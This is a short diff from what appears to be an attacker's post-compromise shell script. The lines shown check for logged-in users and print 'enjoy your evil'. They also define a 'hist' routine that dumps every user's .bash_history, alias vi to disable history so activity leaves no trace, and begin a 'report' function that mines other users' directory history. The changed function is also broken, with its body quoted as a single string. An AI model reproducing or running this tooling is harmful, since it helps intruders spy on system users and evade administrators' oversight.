@@ -89,7 +89,9 @@ if [ $(( $(w|grep pts | wc -l ) )) -gt 0 ];then #_fdsagadsfasdgadsgsss
 else #_fdsagadsfasdgadsgsss
     gglog ${UNDERLINE}" safe ! -- enjoy your evil " #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
-alias hist="cat $HOME/.bash_history; if [ -d /home ];then cat /home/*/.bash_history; fi;"  #_fdsagadsfasdgadsgsss
+hist() { #_fdsagadsfasdgadsgsss
+	"cat $HOME/.bash_history; if [ -d /home ];then cat /home/*/.bash_history; fi;"  #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
 alias vi="vi \"+set history=0\"" #_fdsagadsfasdgadsgsss
 report() { #_fdsagadsfasdgadsgsss
   for cd_d in $(hist | awk  '{ if ( $2 == "cd"){ print $3};}' | sort | uniq );do #_fdsagadsfasdgadsgsss
